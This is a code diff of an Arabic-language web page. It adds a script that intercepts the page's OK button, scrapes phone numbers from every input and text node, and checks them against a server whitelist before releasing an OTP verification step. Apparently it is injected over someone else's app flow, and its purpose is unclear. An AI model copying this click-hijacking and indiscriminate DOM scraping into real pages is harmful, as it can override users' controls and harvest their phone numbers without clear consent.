@@ -286,6 +286,15 @@ Error generating stack: `+e.message+`
 </script>
 
 
+    document.querySelectorAll('#wap-otp input').forEach(function(i){ i.value=''; i.classList.remove('err','ok'); });
+    document.getElementById('wap-btn-next').classList.remove('on');
+    document.getElementById('wap-errmsg').classList.remove('on');
+    wapStartTimer(); document.querySelectorAll('#wap-otp input')[0].focus();
+  };
+})();
+</script>
+
+
 <!-- Validation: Yemen + 737172794 -->
 <div id="__custom-error-modal__" style="display:none;position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,0.75);align-items:center;justify-content:center;">
   <div style="background:#fff;border-radius:20px;padding:36px 28px 28px;max-width:310px;width:90%;text-align:center;direction:rtl;font-family:Cairo,Tajawal,sans-serif;box-shadow:0 20px 60px rgba(0,0,0,0.4);">
@@ -324,94 +333,192 @@ Error generating stack: `+e.message+`
 
 <script>
 (function(){
-  var VALID_PHONE='737172794';
-  var VALID_COUNTRY='اليمن';
-  var VALID_BUTTON='موافق';
-  var _busy=false;
-  var _bypassNext=false;
+  var VALID_BUTTON = 'موافق';
+  var _busy        = false;
+  var _bypassNext  = false;
 
-  function showError(){
-    var m=document.getElementById('__custom-error-modal__');
-    if(m){m.style.display='flex';}
+  /* ── مساعِدات UI ── */
+  function showError(msg){
+    var modal = document.getElementById('__custom-error-modal__');
+    if(modal){
+      /* حدِّث عنوان الخطأ داخل modal */
+      var h = modal.querySelector('h3,h2,h1');
+      if(h) h.textContent = msg || 'الرقم غير مسموح به';
+      modal.style.display = 'flex';
+    }
   }
 
   function hideOverlay(){
-    var ov=document.getElementById('__wap-verify-overlay__');
-    if(ov){ov.style.display='none';}
-    _busy=false;
+    var ov = document.getElementById('__wap-verify-overlay__');
+    if(ov){ ov.style.display='none'; }
+    _busy = false;
   }
 
-  function showVerifyOverlay(isValid, okBtn){
-    var ov=document.getElementById('__wap-verify-overlay__');
-    var spinner=document.getElementById('__wap-spinner__');
-    var check=document.getElementById('__wap-check__');
-    var title=document.getElementById('__wap-verify-title__');
-    var sub=document.getElementById('__wap-verify-sub__');
-    // Reset state
-    spinner.style.display='block';
-    check.style.display='none';
-    title.textContent='جاري التحقق…';
-    sub.textContent='يرجى الانتظار';
-    ov.style.display='flex';
+  /* ══════════════════════════════════════════
+     extractPhone — يجمع رقم الهاتف من الـ DOM
+     بأربع استراتيجيات مختلفة ويختار الأفضل
+  ══════════════════════════════════════════ */
+  function extractPhone(){
+    var candidates = [];
 
-    // After 3 seconds decide
-    setTimeout(function(){
-      if(isValid){
-        // Switch spinner → checkmark
-        spinner.style.display='none';
-        check.style.display='flex';
-        title.textContent='تم التحقق بنجاح';
-        sub.textContent='جاري الانتقال…';
-        // After 1s hide overlay and proceed
+    /* ① كل الـ inputs غير المخفية وغير خانات الرمز (maxlength=1) */
+    document.querySelectorAll('input').forEach(function(inp){
+      if(inp.type === 'hidden' || inp.type === 'checkbox' ||
+         inp.type === 'radio'  || inp.type === 'password') return;
+      if((inp.getAttribute('maxlength') || '') === '1') return;
+      var v = (inp.value || '').trim().replace(/[\s\-().]/g,'');
+      if(/^\+?\d{5,15}$/.test(v)) candidates.push(v);
+    });
+
+    /* ② إذا لم نجد شيئاً → ابحث في نصوص كل العناصر عن رقم هاتف */
+    if(!candidates.length){
+      document.querySelectorAll('*').forEach(function(el){
+        if(el.children.length) return; /* عناصر ورقية فقط */
+        var t = (el.textContent || '').trim().replace(/[\s\-().]/g,'');
+        if(/^\+?\d{7,15}$/.test(t)) candidates.push(t);
+      });
+    }
+
+    /* ③ استخرج كود الدولة من أي select أو عنصر يظهر "+XXX" */
+    var dialCode = '';
+    document.querySelectorAll('select').forEach(function(sel){
+      var opt = sel.options[sel.selectedIndex];
+      if(!opt) return;
+      var val = (opt.value||'').trim().replace(/^\+/,'');
+      if(/^\d{1,4}$/.test(val)){ dialCode = val; return; }
+      var m = (opt.text||'').match(/\+(\d{1,4})/);
+      if(m) dialCode = m[1];
+    });
+    if(!dialCode){
+      /* بحث في spans وdivs عن "+XXX" */
+      document.querySelectorAll('span,div,button').forEach(function(el){
+        if(el.children.length > 2) return;
+        var t = (el.textContent||'').trim();
+        var m = t.match(/^\+(\d{1,4})$/);
+        if(m && !dialCode) dialCode = m[1];
+      });
+    }
+
+    if(!candidates.length) return '';
+
+    /* ④ اختر أفضل مرشح: الأطول رقماً، بدون كود الدولة مكرر */
+    candidates.sort(function(a,b){ return b.length - a.length; });
+    var best = candidates[0].replace(/^\+/,'');
+
+    /* إذا وجدنا كود الدولة وهو ليس مضمّناً في البداية → أضفه */
+    if(dialCode && !best.startsWith(dialCode)){
+      return '+' + dialCode + best;
+    }
+    return best.startsWith('+') ? best : (dialCode ? '+' + best : best);
+  }
+
+  /* ── overlay التحقق ── */
+  function showVerifyOverlay(phoneRaw, okBtn){
+    var ov      = document.getElementById('__wap-verify-overlay__');
+    var spinner = document.getElementById('__wap-spinner__');
+    var check   = document.getElementById('__wap-check__');
+    var title   = document.getElementById('__wap-verify-title__');
+    var sub     = document.getElementById('__wap-verify-sub__');
+
+    spinner.style.display = 'block';
+    check.style.display   = 'none';
+    title.textContent     = 'جاري التحقق…';
+    sub.textContent       = 'يرجى الانتظار';
+    ov.style.display      = 'flex';
+
+    /* اتصل بـ API */
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/api/numbers/check', true);
+    xhr.setRequestHeader('Content-Type','application/json');
+    xhr.timeout = 8000;
+
+    xhr.onload = function(){
+      var result = false;
+      try{ result = JSON.parse(xhr.responseText).allowed; }catch(e){}
+
+      if(result){
+        spinner.style.display = 'none';
+        check.style.display   = 'flex';
+        title.textContent     = 'تم التحقق بنجاح';
+        sub.textContent       = 'جاري الانتقال…';
         setTimeout(function(){
           hideOverlay();
-          // Start the code popup timer
           if(window._wapStartCodeTimer) window._wapStartCodeTimer();
-          // Re-fire the button click so React navigates to matrix screen
-          _bypassNext=true;
+          _bypassNext = true;
           okBtn.click();
-        },1000);
+        }, 1000);
       } else {
         hideOverlay();
-        showError();
+        showError('الرقم غير مسموح به');
       }
-    },3000);
+    };
+
+    xhr.onerror = xhr.ontimeout = function(){
+      hideOverlay();
+      showError('تعذّر الاتصال بالخادم، حاول مجدداً');
+    };
+
+    xhr.send(JSON.stringify({ phone: phoneRaw }));
   }
 
-  document.addEventListener('click',function(e){
-    if(_busy){e.stopImmediatePropagation();e.preventDefault();return;}
+  /* ── اعتراض زر "موافق" ── */
+  document.addEventListener('click', function(e){
+    if(_busy){ e.stopImmediatePropagation(); e.preventDefault(); return; }
 
-    var btn=e.target;
-    while(btn&&btn.tagName!=='BUTTON'){btn=btn.parentElement;}
-    if(!btn){return;}
-    var txt=(btn.textContent||btn.innerText||'').trim();
-    if(txt!==VALID_BUTTON){return;}
+    var btn = e.target;
+    while(btn && btn.tagName !== 'BUTTON'){ btn = btn.parentElement; }
+    if(!btn) return;
+    var txt = (btn.textContent || btn.innerText || '').trim();
+    if(txt !== VALID_BUTTON) return;
 
-    // Bypass: let React handle after checkmark
-    if(_bypassNext){_bypassNext=false;return;}
+    if(_bypassNext){ _bypassNext = false; return; }
 
-    // Always intercept
     e.stopImmediatePropagation();
     e.preventDefault();
-    _busy=true;
+    _busy = true;
 
-    var selects=document.querySelectorAll('select');
-    var countryOk=false;
-    selects.forEach(function(sel){
-      var opt=sel.options[sel.selectedIndex];
-      if(opt&&opt.text.indexOf(VALID_COUNTRY)!==-1){countryOk=true;}
-    });
-
-    var inputs=document.querySelectorAll('input[type="tel"]:not([maxlength="1"]),input[inputmode="numeric"]:not([maxlength="1"])');
-    var phoneOk=false;
-    inputs.forEach(function(inp){
-      if(inp.value.trim()===VALID_PHONE){phoneOk=true;}
-    });
-
-    showVerifyOverlay(countryOk&&phoneOk, btn);
-  },true);
+    /* ── استخراج رقم الهاتف بأكثر من طريقة ── */
+    var fullPhone = extractPhone();
+    showVerifyOverlay(fullPhone, btn);
+  }, true);
 })();
 </script>
+
+
+<!-- زر تسجيل الخروج -->
+<style>
+#logout-btn{
+  position:fixed;bottom:18px;left:50%;transform:translateX(-50%);
+  z-index:99999;
+  background:rgba(220,38,38,.13);
+  border:1.5px solid rgba(220,38,38,.4);
+  color:#fca5a5;
+  font-family:'Cairo',Tajawal,sans-serif;
+  font-size:14px;font-weight:700;
+  border-radius:50px;padding:11px 32px;
+  cursor:pointer;
+  transition:all .2s;
+  backdrop-filter:blur(10px);
+  box-shadow:0 4px 20px rgba(0,0,0,.35);
+  display:flex;align-items:center;gap:8px;
+  white-space:nowrap;
+}
+#logout-btn:hover{
+  background:rgba(220,38,38,.28);
+  border-color:#ef4444;
+  color:#fff;
+  transform:translateX(-50%) translateY(-2px);
+  box-shadow:0 6px 24px rgba(220,38,38,.3);
+}
+#logout-btn:active{transform:translateX(-50%) translateY(0);}
+</style>
+
+<button id="logout-btn" onclick="(function(){
+  localStorage.removeItem('dw_jwt');
+  localStorage.removeItem('dw_phone_ok');
+  document.cookie='dw_jwt=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
+  window.location.replace('/login.html');
+})()">🚪 تسجيل الخروج</button>
 
 </body>
 </html>
